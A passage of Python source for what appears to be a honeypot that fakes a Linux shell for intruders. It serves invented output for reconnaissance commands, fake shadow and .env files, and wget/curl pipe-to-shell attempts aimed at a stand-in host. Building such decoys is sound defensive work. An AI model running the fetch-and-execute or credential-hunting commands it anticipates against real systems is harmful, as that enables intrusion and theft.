        "root": "0", "www-data": "33", "ubuntu": "1000",
        "deploy": "1001", "mysql": "112", "redis": "114",
        "postgres": "113",
    }.get(proc["user"], "1001")

    name     = proc["cmd"].split()[0].split("/")[-1]
    now      = time.time()
    boot_time= state["boot_time"]

    # VmRSS fluctuates
    rss = max(0, int(proc["base_rss"] * random.uniform(0.97, 1.03)))

    return (
        f"Name:\t{name}\n"
        f"Umask:\t0022\n"
        f"State:\tS (sleeping)\n"
        f"Tgid:\t{pid}\n"
        f"Pid:\t{pid}\n"
        f"PPid:\t{proc['ppid']}\n"
        f"TracerPid:\t0\n"
        f"Uid:\t{user_uid}\t{user_uid}\t{user_uid}\t{user_uid}\n"
        f"Gid:\t{user_uid}\t{user_uid}\t{user_uid}\t{user_uid}\n"
        f"FDSize:\t256\n"
        f"VmPeak:\t{proc['vsz'] + random.randint(0, 1000):>7} kB\n"
        f"VmSize:\t{proc['vsz']:>7} kB\n"
        f"VmRSS:\t{rss:>7} kB\n"
        f"Threads:\t{random.randint(1, 4)}\n"
        f"SigBlk:\t0000000000000000\n"
        f"SigIgn:\t0000000000001000"
    )


# ============================================================
# GREP — reads from VFS for consistency
# ============================================================

def _grep_file(state, path, pattern, case_insensitive=False):
    """
    Grep from VFS — guaranteed consistent with cat output.
    """
    file_entry = _get_file(state, path)

    if file_entry is None:
        # Try common path variations
        profile = state["profile"]
        webroot = profile.get("webroot", "/var/www/html")
        if path == ".env":
            file_entry = _get_file(state, f"{webroot}/.env")
        elif path == "config.php":
            file_entry = _get_file(state, f"{webroot}/config.php")

    if file_entry is None:
        return f"grep: {path}: No such file or directory"

    content = file_entry[0] if isinstance(file_entry, tuple) else file_entry
    matched = []

    for line in content.splitlines():
        check = line.lower() if case_insensitive else line
        pat   = pattern.lower() if case_insensitive else pattern
        if pat in check:
            matched.append(line)

    return "\n".join(matched)


# ============================================================
# FIND — reads from VFS for consistency
# ============================================================

def _find_files(state, command):
    """
    find command — returns paths consistent with VFS.
    """
    c       = normalize_command(command).lower()
    profile = state["profile"]
    webroot = profile.get("webroot", "/var/www/html")
    files   = state["files"]

    if '".env"' in c or "'.env'" in c or "-name .env" in c:
        return "\n".join(p for p in files if p.endswith("/.env"))

    if '"config.php"' in c or "config.php" in c:
        return "\n".join(p for p in files if p.endswith("/config.php"))

    if '"*.bak"' in c or "*.bak" in c:
        return "\n".join([
            f"{webroot}/config.php.bak",
            f"{webroot}/.env.bak",
            "/home/deploy/backup_db.sql.bak",
        ])

    if '"backup*"' in c or "backup*" in c:
        return "\n".join([
            "/home/deploy/backup_db.sql",
            "/var/backups/site_backup.tar.gz",
            f"{webroot}/backup.zip",
        ])

    if '"*.php"' in c or "*.php" in c:
        return "\n".join([
            f"{webroot}/index.php",
            f"{webroot}/config.php",
            f"{webroot}/login.php",
            f"{webroot}/admin.php",
        ])

    if "id_rsa" in c:
        return "/home/deploy/.ssh/id_rsa"

    if '"*.log"' in c or "*.log" in c:
        return (
            "/var/log/nginx/access.log\n"
            "/var/log/nginx/error.log\n"
            "/var/log/auth.log\n"
            "/var/log/syslog"
        )

    if "perm.*4000" in c or "-perm -u=s" in c:
        return (
            "/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/newgrp\n"
            "/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/su\n"
            "/bin/mount\n/bin/umount\n/usr/bin/pkexec"
        )

    return ""


# ============================================================
# MAIN DISPATCHER
# ============================================================

def hard_rule_response(command, user, hostname, cwd, profile,
                       session_id=None, vfs=None):
    """
    Main entry point.
    Returns deterministic but dynamic terminal output.
    Returns None if command should go to the model.

    Args:
        command:    Raw attacker command
        user:       Current user
        hostname:   Profile hostname
        cwd:        Current working directory
        profile:    Fake host profile dict
        session_id: Session identifier for state tracking
        vfs:        Legacy VFS dict (optional, overridden by session state)
    """
    if session_id is None:
        session_id = f"{hostname}|{user}"

    state = _get_state(session_id, profile)
    c     = normalize_command(command).lower()
    raw   = normalize_command(command)

    # ── SHELL BUILTINS (return success/empty, never "not found") ──

    if c == "cd" or c.startswith("cd ") or c.startswith("cd\t"):
        return ""

    if (c.startswith("export ") or c.startswith("unset ") or
            c.startswith("alias ") or c.startswith("unalias ") or
            c.startswith("set ") or c == "set" or
            c.startswith("source ") or c.startswith(". ") or
            c.startswith("umask") or c.startswith("shopt") or
            c.startswith("eval ") or c.startswith("readonly ") or
            c.startswith("local ") or c.startswith("declare ")):
        return ""

    if c == "clear" or c == "reset":
        return ""

    if c.startswith("trap ") or c.startswith("wait") or c == "true":
        return ""

    if c == "false":
        return ""

    # ── IDENTITY ────────────────────────────────────────────

    if c == "pwd":
        return cwd

    if c == "whoami":
        return user

    if c == "hostname":
        return profile["hostname"]

    if c in ["uname -a", "uname"]:
        return f"Linux {profile['hostname']} {profile['kernel']} #101-Ubuntu SMP x86_64 x86_64 x86_64 GNU/Linux"

    if c == "uname -r":
        return profile["kernel"]

    if c == "uname -m":
        return "x86_64"

    if c in ["uname -s"]:
        return "Linux"

    if c in ["uname -n"]:
        return profile["hostname"]

    if c in ["uname -o"]:
        return "GNU/Linux"

    if c in ["arch"]:
        return "x86_64"

    if c in ["nproc"]:
        return "4"

    if c == "id":
        if user == "root":
            return "uid=0(root) gid=0(root) groups=0(root)"
        if user == "www-data":
            return "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
        if user == "ubuntu":
            return "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),27(sudo),116(lxd)"
        if user == "deploy":
            return "uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),33(www-data)"
        return f"uid=1001({user}) gid=1001({user}) groups=1001({user})"

    if c.startswith("id "):
        target = c.split()[1]
        if target == "root":
            return "uid=0(root) gid=0(root) groups=0(root)"
        if target == "www-data":
            return "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
        return f"uid=1001({target}) gid=1001({target}) groups=1001({target})"

    # ── UPTIME — live clock ──────────────────────────────────

    if c == "uptime":
        return _get_live_uptime(state)

    if c == "uptime -p":
        elapsed = time.time() - state["boot_time"]
        days    = int(elapsed // 86400)
        hours   = int((elapsed % 86400) // 3600)
        mins    = int((elapsed % 3600) // 60)
        return f"up {days} days, {hours} hours, {mins} minutes"

    if c == "uptime -s":
        return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(state["boot_time"]))

    if c in ["/proc/uptime", "cat /proc/uptime"]:
        elapsed = time.time() - state["boot_time"]
        idle    = elapsed * random.uniform(2.5, 3.5)
        return f"{elapsed:.2f} {idle:.2f}"

    # ── DATE ─────────────────────────────────────────────────

    if c in ["date", "date -u"]:
        return time.strftime("%a %b %d %H:%M:%S UTC %Y")

    if c == "date +%s":
        return str(int(time.time()))

    if c == "date +%y-%m-%d":
        return time.strftime("%Y-%m-%d")

    if c in ["timedatectl", "timedatectl status"]:
        boot_str = time.strftime("%a %Y-%m-%d %H:%M:%S UTC", time.localtime(state["boot_time"]))
        return (
            f"               Local time: {time.strftime('%a %Y-%m-%d %H:%M:%S UTC')}\n"
            f"           Universal time: {time.strftime('%a %Y-%m-%d %H:%M:%S UTC')}\n"
            f"                 RTC time: {time.strftime('%a %Y-%m-%d %H:%M:%S')}\n"
            f"                Time zone: UTC (UTC, +0000)\n"
            f"System clock synchronized: yes\n"
            f"              NTP service: active\n"
            f"          RTC in local TZ: no"
        )

    # ── OS RELEASE ───────────────────────────────────────────

    if c in ["cat /etc/os-release", "cat /etc/lsb-release"]:
        os_name = profile.get("os", "Ubuntu 22.04 LTS")
        if "Ubuntu 22" in os_name:
            return ('NAME="Ubuntu"\nVERSION="22.04.3 LTS (Jammy Jellyfish)"\n'
                    'ID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 22.04.3 LTS"\n'
                    'VERSION_ID="22.04"\nHOME_URL="https://www.ubuntu.com/"\n'
                    'VERSION_CODENAME=jammy')
        if "Ubuntu 20" in os_name:
            return ('NAME="Ubuntu"\nVERSION="20.04.6 LTS (Focal Fossa)"\n'
                    'ID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 20.04.6 LTS"\n'
                    'VERSION_ID="20.04"\nHOME_URL="https://www.ubuntu.com/"\n'
                    'VERSION_CODENAME=focal')
        if "Debian 9" in os_name:
            return ('PRETTY_NAME="Debian GNU/Linux 9 (stretch)"\nNAME="Debian GNU/Linux"\n'
                    'VERSION_ID="9"\nVERSION="9 (stretch)"\nID=debian')
        return f'PRETTY_NAME="{os_name}"\nNAME="{os_name.split()[0]}"'

    if c in ["lsb_release -a", "lsb_release -d"]:
        os_name = profile.get("os", "Ubuntu 22.04 LTS")
        if "Ubuntu 22" in os_name:
            return ("No LSB modules are available.\nDistributor ID:\tUbuntu\n"
                    "Description:\tUbuntu 22.04.3 LTS\nRelease:\t22.04\nCodename:\tjammy")
        if "Ubuntu 20" in os_name:
            return ("No LSB modules are available.\nDistributor ID:\tUbuntu\n"
                    "Description:\tUbuntu 20.04.6 LTS\nRelease:\t20.04\nCodename:\tfocal")
        if "Debian 9" in os_name:
            return ("No LSB modules are available.\nDistributor ID:\tDebian\n"
                    "Description:\tDebian GNU/Linux 9.13 (stretch)\nRelease:\t9.13\nCodename:\tstretch")
        return f"Distributor ID:\t{os_name.split()[0]}"

    if c == "cat /proc/version":
        return (f"Linux version {profile['kernel']} (buildd@lcy02-amd64-041) "
                f"(gcc version 11.4.0 (Ubuntu 11.4.0-1ubuntu1~22.04)) "
                f"#101-Ubuntu SMP Thu Jan 11 14:46:51 UTC 2024")

    # ── USERS / PERMISSIONS ──────────────────────────────────

    if c == "sudo -l":
        if user == "root":
            return f"Sorry, user root may not run sudo on {profile['hostname']}."
        if user == "ubuntu":
            return (f"Matching Defaults entries for ubuntu on {profile['hostname']}:\n"
                    f"    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\n"
                    f"User ubuntu may run the following commands on {profile['hostname']}:\n"
                    f"    (ALL : ALL) ALL")
        return f"Sorry, user {user} may not run sudo on {profile['hostname']}."

    if c == "groups":
        if user == "root":     return "root"
        if user == "ubuntu":   return "ubuntu adm cdrom sudo dip plugdev lxd"
        if user == "www-data": return "www-data"
        return user

    if c.startswith("groups "):
        target = c.split()[1]
        return f"{target} : {target} adm sudo www-data"

    if c in ["who", "w"]:
        return f"{user}    pts/0        {time.strftime('%Y-%m-%d %H:%M')} (198.51.100.3)"

    if c == "last":
        boot_str = time.strftime("%a %b %d %H:%M", time.localtime(state["boot_time"]))
        return (
            f"{user}    pts/0        198.51.100.3     {time.strftime('%a %b %d %H:%M')} still logged in\n"
            f"{user}    pts/0        198.51.100.3     Mon Jun  2 09:14   gone - no logout\n"
            f"reboot   system boot  {profile['kernel']}  {boot_str}   still running\n"
            f"wtmp begins {boot_str} 2026"
        )

    if c in ["last -n 5", "last -5"]:
        return (
            f"{user}    pts/0        198.51.100.3     {time.strftime('%a %b %d %H:%M')} still logged in\n"
            f"reboot   system boot  {profile['kernel']}  {time.strftime('%a %b %d %H:%M', time.localtime(state['boot_time']))}   still running"
        )

    if c in ["env", "printenv"]:
        env   = profile.get("env", {})
        lines = [f"{k}={v}" for k, v in env.items()]
        lines += [
            f"USER={user}",
            f"HOME=/{'root' if user == 'root' else 'home/' + user}",
            f"HOSTNAME={profile['hostname']}",
            "SHELL=/bin/bash",
            "TERM=xterm-256color",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            f"PWD={cwd}",
            "LANG=en_US.UTF-8",
            "SHLVL=1",
        ]
        return "\n".join(lines)

    if c.startswith("getent passwd"):
        parts = c.split()
        if len(parts) >= 3:
            target = parts[2]
            if target == "root":
                return "root:x:0:0:root:/root:/bin/bash"
            if target == "www-data":
                return "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
            if target == "deploy":
                return "deploy:x:1000:1000:Deploy User:/home/deploy:/bin/bash"
            return f"{target}:x:1001:1001:{target.capitalize()} User:/home/{target}:/bin/bash"
        return ""

    # ── FILE LISTING ─────────────────────────────────────────

    if c in ["ls", "ls ."]:
        if cwd == "/":
            return "bin\nboot\ndev\netc\nhome\nlib\nlib64\nlost+found\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\ntmp\nusr\nvar"
        webroot = profile.get("webroot", "/var/www/html")
        if cwd == webroot:
            vuln = profile.get("vulnerability", "")
            if vuln in ["exposed_laravel_env", "exposed_dev_env"]:
                return "index.php\nlogin.php\nconfig.php\nassets\nuploads\nvendor\n.env"
            if vuln == "old_php_config":
                return "index.php\nadmin.php\nconfig.php\nbackup.zip\nuploads"
        if cwd in ["/home/ubuntu", "/home/deploy"]:
            return "backup.sh\ndeploy.sh\nnotes.txt\napp\n.env"
        if cwd == "/root":
            return "backup\nscripts\nserver.key\n.bash_history"
        if cwd == "/tmp":
            return "d2\nsystemd-private-abc\ntmux-0"
        if cwd == "/etc":
            return "apt\nbash.bashrc\ncron.d\ncrontab\ndefault\nenvironment\nhostname\nhosts\nmysql\nnginx\npasswd\nshadow\nssh\nssl\nsudoers"
        return "app\nconfig\nlogs\ntmp"

    if c in ["ls -la", "ll", "ls -al", "ls -la ."]:
        return _get_live_ls_la(state, cwd)

    if c.startswith("ls -la ") or c.startswith("ls -l "):
        path = c.split(None, 2)[-1]
        return _get_live_ls_la(state, path)

    # ── NETWORK ──────────────────────────────────────────────

    if c in ["ip a", "ip addr", "ip address", "/sbin/ip a", "/sbin/ip addr"]:
        ip  = profile.get("ip", "192.168.1.100")
        mac = profile.get("mac", "02:42:ac:11:00:08")
        prefix = ip.rsplit(".", 1)[0]
        return (
            f"1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n"
            f"    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n"
            f"    inet 127.0.0.1/8 scope host lo\n"
            f"       valid_lft forever preferred_lft forever\n"
            f"    inet6 ::1/128 scope host\n"
            f"       valid_lft forever preferred_lft forever\n"
            f"2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n"
            f"    link/ether {mac} brd ff:ff:ff:ff:ff:ff\n"
            f"    inet {ip}/24 brd {prefix}.255 scope global eth0\n"
            f"       valid_lft forever preferred_lft forever\n"
            f"    inet6 fe80::42:acff:fe11:8/64 scope link\n"
            f"       valid_lft forever preferred_lft forever"
        )

    if c in ["ip route", "ip r", "route", "route -n"]:
        ip     = profile.get("ip", "192.168.1.100")
        prefix = ip.rsplit(".", 1)[0]
        return (
            f"Kernel IP routing table\n"
            f"Destination     Gateway         Genmask         Flags Metric Ref    Use Iface\n"
            f"0.0.0.0         {prefix}.1       0.0.0.0         UG    100    0        0 eth0\n"
            f"{prefix}.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0\n"
            f"127.0.0.0       0.0.0.0         255.0.0.0       U     0      0        0 lo"
        )

    if c in ["arp -a", "arp -n"]:
        ip     = profile.get("ip", "192.168.1.100")
        prefix = ip.rsplit(".", 1)[0]
        return (
            f"Address                  HWtype  HWaddress           Flags Mask  Iface\n"
            f"{prefix}.1             ether   02:42:ac:11:00:01   C           eth0\n"
            f"198.51.100.3             ether   02:42:ac:11:00:2c   C           eth0"
        )

    if c == "ifconfig" or c.startswith("ifconfig ") or c == "/sbin/ifconfig" or c.startswith("/sbin/ifconfig"):
        ip  = profile.get("ip", "192.168.1.100")
        mac = profile.get("mac", "02:42:ac:11:00:08")
        prefix = ip.rsplit(".", 1)[0]
        # RX/TX vary slightly
        rx_packets = 184239 + random.randint(0, 500)
        tx_packets = 92217  + random.randint(0, 200)
        return (
            f"eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
            f"        inet {ip}  netmask 255.255.255.0  broadcast {prefix}.255\n"
            f"        inet6 fe80::42:acff:fe11:8  prefixlen 64  scopeid 0x20<link>\n"
            f"        ether {mac}  txqueuelen 1000  (Ethernet)\n"
            f"        RX packets {rx_packets}  bytes {rx_packets * 129} ({rx_packets * 129 / 1e6:.1f} MB)\n"
            f"        RX errors 0  dropped 0  overruns 0  frame 0\n"
            f"        TX packets {tx_packets}  bytes {tx_packets * 160} ({tx_packets * 160 / 1e6:.1f} MB)\n"
            f"        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n"
            f"lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n"
            f"        inet 127.0.0.1  netmask 255.0.0.0\n"
            f"        loop  txqueuelen 1000  (Local Loopback)"
        )

    if c.startswith("netstat"):
        base = _get_live_netstat(state)
        if "| grep" in c:
            pattern = c.split("grep", 1)[1].strip().strip("'\"").split()[0]
            return "\n".join(l for l in base.splitlines() if pattern in l or "Local Address" in l or "Active" in l)
        return base

    if c.startswith("ss "):
        base = _get_live_ss(state)
        if "| grep" in c:
            pattern = c.split("grep", 1)[1].strip().strip("'\"").split()[0]
            return "\n".join(l for l in base.splitlines() if pattern in l or "Netid" in l)
        return base

    # ── REDIS-CLI (hard rule — model was unreliable here) ────
    # redis-cli is consistently the model's weakest command (loops, or
    # emits raw RESP protocol). The key space is stable enough to serve
    # deterministically and consistently.
    if c.startswith("redis-cli"):
        rc = c[len("redis-cli"):].strip()
        # redis-cli keys "*"  /  keys *
        if rc.startswith("keys"):
            return ('1) "session:sess_8a3f21"\n'
                    '2) "cache:user:1001"\n'
                    '3) "cache:user:1002"\n'
                    '4) "cache:config"\n'
                    '5) "rate_limit:192.168.1.55"\n'
                    '6) "queue:emails"\n'
                    '7) "session:sess_b7c4e9"\n'
                    '8) "cache:homepage"\n'
                    '9) "lock:cron"')
        if rc.startswith("ping"):
            return "PONG"
        if rc.startswith("info"):
            return ("# Server\nredis_version:6.0.16\n"
                    "redis_mode:standalone\nos:Linux 5.15.0-91-generic x86_64\n"
                    "tcp_port:6379\nuptime_in_seconds:ila\n"
                    "# Clients\nconnected_clients:3\n"
                    "# Memory\nused_memory_human:2.41M\n"
                    "# Keyspace\ndb0:keys=9,expires=2,avg_ttl=0").replace("ila", "284113")
        if rc.startswith("get "):
            return "(nil)"
        if rc.startswith("dbsize"):
            return "(integer) 9"
        if rc.startswith("config get"):
            return '1) "maxmemory"\n2) "268435456"'
        # interactive redis-cli with no subcommand → prompt-like
        if rc == "":
            return "127.0.0.1:6379>"
        # other subcommands → let model try
        return None

    # ── PROCESSES ────────────────────────────────────────────

    if c == "ps aux":
        return _get_live_ps_aux(state)

    if c == "ps -ef":
        return _get_live_ps_ef(state)

    if c.startswith("ps aux | grep") or c.startswith("ps aux |grep"):
        pattern = c.split("grep", 1)[1].strip().strip("'\"").split()[0] if "grep" in c else ""
        return _get_live_ps_grep(state, pattern)

    if c.startswith("ps -ef | grep") or c.startswith("ps -ef |grep"):
        pattern = c.split("grep", 1)[1].strip().strip("'\"").split()[0] if "grep" in c else ""
        lines   = _get_live_ps_ef(state).splitlines()
        matched = [l for l in lines[1:] if pattern.lower() in l.lower()]
        grep_pid = max(p["pid"] for p in state["processes"]) + random.randint(1, 50)
        matched.append(
            f"{'root':<12} {grep_pid:>5} {'1501':>7}  0 "
            f"{time.strftime('%H:%M')} {'pts/0':<12} 00:00:00 grep --color=auto {pattern}"
        )
        return "\n".join(matched)

    # ── /proc/PID/status — now handled by model (see block above) ─
    if c.startswith("cat /proc/") and "/status" in c:
        m = re.search(r"/proc/(\d+)/status", c)
        if m:
            return _get_proc_status(state, int(m.group(1)))

    # ── MEMORY / DISK ────────────────────────────────────────

    if c in ["free -h", "free"]:
        return _get_live_free("h")

    if c in ["free -m", "free -b"]:
        return _get_live_free("m")

    if c in ["df -h", "df -hT", "df"]:
        return _get_live_df()

    if c == "df -h /":
        used = int(12 * random.uniform(0.98, 1.02))
        return f"Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        49G  {used}G   {49-used}G  {int(used/49*100)}% /"

    if c == "mount":
        return (
            "sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\n"
            "proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\n"
            "devtmpfs on /dev type devtmpfs (rw,nosuid,size=1974300k)\n"
            "tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)\n"
            "/dev/sda1 on / type ext4 (rw,relatime)\n"
            "tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime)\n"
            "/dev/sda15 on /boot/efi type vfat (rw,relatime)"
        )

    if c == "cat /proc/meminfo":
        total = 3985920
        free  = int(935040 * random.uniform(0.9, 1.1))
        avail = int(2419200 * random.uniform(0.9, 1.1))
        return (
            f"MemTotal:        {total} kB\n"
            f"MemFree:          {free} kB\n"
            f"MemAvailable:    {avail} kB\n"
            f"Buffers:          {int(128340 * random.uniform(0.95,1.05))} kB\n"
            f"Cached:          {int(1485940 * random.uniform(0.95,1.05))} kB\n"
            f"SwapTotal:       1048576 kB\n"
            f"SwapFree:        1048576 kB"
        )

    # ── FILE READS FROM VFS ──────────────────────────────────

    webroot = profile.get("webroot", "/var/www/html")

    # .env files — from VFS
    env_paths = [
        "cat .env",
        f"cat {webroot}/.env",
        "cat /opt/app/.env",
        "cat /home/deploy/.env",
    ]
    if c in [x.lower() for x in env_paths]:
        # Find which path was requested
        for ep in [f"{webroot}/.env", "/opt/app/.env", "/home/deploy/.env"]:
            entry = _get_file(state, ep)
            if entry:
                content = entry[0] if isinstance(entry, tuple) else entry
                return content

    if c == "cat /etc/passwd":
        return _build_passwd(profile)

    # ── ENCODING / HASHING (hard rules — deterministic algorithms) ──
    # base64, md5sum, sha256sum etc. produce ONE correct output for a given
    # input. The model can't compute them (it hallucinates the characters),
    # so we compute the real value from the file's actual content.
    for enc_cmd, fn in (("base64 ", "b64"), ("md5sum ", "md5"),
                        ("sha1sum ", "sha1"), ("sha256sum ", "sha256")):
        if c.startswith(enc_cmd):
            path = raw[len(enc_cmd):].strip().strip('"').strip("'")
            content = _resolve_file_content(path, profile, state)
            if content is None:
                fname = enc_cmd.strip()
                return f"{fname}: {path}: No such file or directory"
            data = content.encode() if isinstance(content, str) else content
            if fn == "b64":
                import base64 as _b64
                return _b64.b64encode(data).decode()
            import hashlib as _hl
            h = {"md5": _hl.md5, "sha1": _hl.sha1, "sha256": _hl.sha256}[fn](data).hexdigest()
            return f"{h}  {path}"


    if c == "cat /etc/shadow":
        if user != "root":
            return "cat: /etc/shadow: Permission denied"
        return (
            "root:$6$rounds=656000$salt$hashedpassword:19500:0:99999:7:::\n"
            "daemon:*:19500:0:99999:7:::\n"
            "nobody:*:19500:0:99999:7:::\n"
            "sshd:!:19500:0:99999:7:::\n"
            "deploy:$6$rounds=656000$salt2$hashedpassword2:19500:0:99999:7:::\n"
        )

    if c == "cat /etc/hosts":
        ip       = profile.get("ip", "192.168.1.100")
        hostname = profile.get("hostname", "web-prod-01")
        return (
            f"127.0.0.1 localhost\n"
            f"127.0.1.1 {hostname}\n"
            f"{ip} {hostname}\n"
            f"::1 localhost ip6-localhost ip6-loopback"
        )

    if c == "cat /etc/hostname":
        return profile["hostname"]

    # config.php from VFS
    if c in [f"cat {webroot}/config.php".lower(), "cat config.php"]:
        entry = _get_file(state, f"{webroot}/config.php")
        if entry:
            return entry[0] if isinstance(entry, tuple) else entry

    # bash history from VFS
    if c in ["history", "cat ~/.bash_history", "cat /root/.bash_history"]:
        entry = _get_file(state, "/root/.bash_history")
        if entry:
            content = entry[0] if isinstance(entry, tuple) else entry
            # Format as numbered history
            return "\n".join(f"  {i+1:>4}  {line}" for i, line in enumerate(content.splitlines()))

    if c == "cat /etc/crontab":
        return (
            "# /etc/crontab: system-wide crontab\n"
            "SHELL=/bin/sh\n"
            "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n"
            "17 *  * * *  root  cd / && run-parts --report /etc/cron.hourly\n"
            "25 6  * * *  root  test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n"
            "47 6  * * 7  root  test -x /usr/sbin/anacron || run-parts --report /etc/cron.weekly"
        )

    if c in ["cat /root/.ssh/authorized_keys", "cat ~/.ssh/authorized_keys"]:
        entry = _get_file(state, "/root/.ssh/authorized_keys")
        if entry:
            return entry[0] if isinstance(entry, tuple) else entry

    if c == "cat /etc/issue":
        return f"{profile.get('os', 'Ubuntu 22.04 LTS')} \\n \\l"

    if c == "cat /etc/environment":
        return 'PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"'

    # ── CRONTAB ──────────────────────────────────────────────

    if c == "crontab -l":
        elapsed = time.time() - state["boot_time"]
        last_run_min = int(elapsed / 60) % 5
        return (
            f"*/5 * * * * /usr/local/bin/backup.sh > /dev/null 2>&1\n"
            f"@reboot sleep 30 && /home/ubuntu/start_service.py &\n"
            f"10 * * * * /usr/bin/tail -n 10 /var/log/nginx/access.log >> /var/log/cron_logs.txt\n"
            f"@hourly /usr/bin/python3 /opt/monitoring/check_status.py"
        )

    # ── FIND — from VFS ──────────────────────────────────────

    if c.startswith("find "):
        return _find_files(state, raw)

    # ── GREP — from VFS ──────────────────────────────────────

    if c.startswith("grep "):
        parts = normalize_command(command).split()
        flags   = [p for p in parts[1:] if p.startswith("-")]
        non_flags = [p for p in parts[1:] if not p.startswith("-")]
        if len(non_flags) >= 2:
            pattern  = non_flags[0].strip("'\"")
            filepath = non_flags[1]
            ci       = any("i" in f for f in flags)
            recursive= any("r" in f.lower() for f in flags)

            if recursive:
                # Recursive grep over VFS
                results = []
                for path, entry in state["files"].items():
                    content = entry[0] if isinstance(entry, tuple) else entry
                    for line in content.splitlines():
                        check = line.lower() if ci else line
                        pat   = pattern.lower() if ci else pattern
                        if pat in check:
                            results.append(f"{path}:{line}")
                return "\n".join(results)

            return _grep_file(state, filepath, pattern, ci)

    # Pipe grep (cat file | grep pattern)
    if "|" in c and "grep" in c and not c.startswith("ps"):
        grep_part = c.split("grep", 1)[1].strip()
        pattern   = grep_part.strip("'\"").split()[0] if grep_part.split() else ""
        # Try to find what file was being cat'd
        pre_pipe = c.split("|")[0].strip()
        if pre_pipe.startswith("cat "):
            filepath = pre_pipe[4:].strip()
            return _grep_file(state, filepath, pattern)

    # ── LOG FILES — growing over time ────────────────────────

    if c.startswith("tail ") and "/var/log" in c:
        # Extract n_lines
        n_match = re.search(r"-n\s+(\d+)", c)
        n_lines = int(n_match.group(1)) if n_match else 10

        if "nginx" in c and "access" in c:
            return _get_live_nginx_log(state, n_lines)
        if "nginx" in c and "error" in c:
            return (
                f'2026/06/01 {time.strftime("%H:%M:%S")} [error] 842#842: *1 open() '
                f'"/var/www/html/favicon.ico" failed (2: No such file or directory)\n'
                f'2026/06/01 {time.strftime("%H:%M:%S")} [warn] 842#842: *5 upstream response is buffered'
            )
        if "auth" in c:
            return _get_live_auth_log(state, n_lines)
        if "syslog" in c:
            return _get_live_syslog(state, n_lines)

    if c.startswith("cat /var/log"):
        if "nginx" in c and "access" in c:
            return _get_live_nginx_log(state, 20)
        if "auth" in c:
            return _get_live_auth_log(state, 20)
        if "syslog" in c:
            return _get_live_syslog(state, 20)

    # ── DOWNLOAD / EXECUTE ───────────────────────────────────

    if c.startswith("wget ") or c.startswith("curl "):
        url_match = re.search(r"https?://\S+", raw)
        url       = url_match.group(0) if url_match else "http://198.51.100.3/d2"
        filename  = url.rstrip("/").split("/")[-1]
        pipe_exec = "| sh" in c or "| bash" in c

        if c.startswith("wget"):
            size_kb = random.randint(50, 500)
            speed   = random.randint(1000, 5000)
            dl_time = f"{time.strftime('%Y-%m-%d %H:%M:%S')}"
            if pipe_exec:
                return (
                    f"--{dl_time}--  {url}\n"
                    f"Connecting to {url.split('/')[2]}:80... connected.\n"
                    f"HTTP request sent, awaiting response... 200 OK\n"
                    f"Length: {size_kb * 1024} ({size_kb}K) [application/x-sh]\n"
                    f"Saving to: 'STDOUT'\n\n"
                    f"     0K .{'.' * 30} 100%  {speed}K=0s\n\n"
                    f"{dl_time} ({speed} KB/s) - written to stdout [{size_kb*1024}/{size_kb*1024}]\n\n"
                    f"sh: 3: Syntax error: \"(\" unexpected"
                )
            return (
                f"--{dl_time}--  {url}\n"
                f"Connecting to {url.split('/')[2]}:80... connected.\n"
                f"HTTP request sent, awaiting response... 200 OK\n"
                f"Length: {size_kb * 1024} ({size_kb}K) [application/octet-stream]\n"
                f"Saving to: '{filename}'\n\n"
                f"{filename:<20}100%[===================>] {size_kb:>5}K  {speed}KB/s    in 0.{random.randint(1,9)}s\n\n"
                f"{dl_time} ({speed} MB/s) - '{filename}' saved [{size_kb*1024}/{size_kb*1024}]"
            )

        if c.startswith("curl"):
            size = random.randint(500, 2000)
            speed = random.randint(30000, 80000)
            if pipe_exec:
                return (
                    f"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n"
                    f"                                 Dload  Upload   Total   Spent    Left  Speed\n"
                    f"100  {size}  100  {size}    0     0  {speed}      0 --:--:-- --:--:-- --:--:-- {speed+1000}\n"
                    f"sh: 1: ELF: not found"
                )
            return (
                f"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n"
                f"                                 Dload  Upload   Total   Spent    Left  Speed\n"
                f"100  {size}  100  {size}    0     0  {speed}      0 --:--:-- --:--:-- --:--:-- {speed+1000}"
            )

    if c.startswith("chmod "):
        return ""

    if c.startswith("./") or c.startswith("/tmp/"):
        return "bash: ./d2: cannot execute binary file: Exec format error"

    if c.startswith("echo "):
        if ">" in raw:
            return ""
        return raw[5:].strip().strip('"').strip("'")

    # ── SYSTEMCTL ────────────────────────────────────────────

    if c.startswith("systemctl status "):
        svc      = c.replace("systemctl status ", "").strip()
        services = profile.get("services", [])
